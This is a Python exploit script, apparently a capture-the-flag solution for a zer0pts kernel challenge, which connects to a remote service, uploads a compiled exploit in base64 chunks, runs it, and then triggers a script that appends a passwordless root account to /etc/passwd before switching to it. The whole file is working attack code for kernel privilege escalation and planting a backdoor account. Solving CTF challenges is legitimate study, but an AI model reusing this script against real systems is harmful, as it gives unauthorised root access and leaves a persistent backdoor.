#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import os

bin_file = './start.sh'
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET')
env.set_item('target',  local   = {'argv':[bin_file]}, \
                        remote  = {'host':'54.249.58.143', 'port':9003})
env.select()

#==========

def attack(conn, **kwargs):
    exploit = generate_exploit('./exploit.c')

    conn.sendlineafter('$', 'cd /tmp')

    with log.progress('Sending exploit ') as p:
        for i in range(0, len(exploit), 0x80):
            conn.sendlineafter('$', 'echo {} >> exploit.b64'.format(exploit[i:i+0x80].decode('utf8')))
            p.status("{} bytes".format(i))

    conn.sendlineafter('$', 'base64 -d exploit.b64 > exploit && chmod +x exploit')
    conn.sendlineafter('$', './exploit &')

    conn.sendlineafter('$', 'echo -ne "#!/bin/sh\necho admin::0:0::/root:/bin/sh >> /etc/passwd\n" > mp && chmod +x mp')
    conn.sendlineafter('$', 'echo -ne "\\xff\\xff\\xff\\xff" > a && chmod +x a')

    conn.sendlineafter('$', './a')
    conn.sendlineafter('$', 'cd - && su admin -')

def generate_exploit(source):
    program = tempfile.mktemp()

    process('gcc {} -masm=intel -fno-PIE -nostdlib -no-pie -o {}'.format(source, program).split()).wait_for_close()
    exploit = base64.b64encode(open(program, 'rb').read())

    os.unlink(program)

    return exploit

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # zer0pts{h34p_0v3rfl0w_VS_k4slr+sm3p+sm4p+ktp1}

if __name__=='__main__':
    main()

#==========
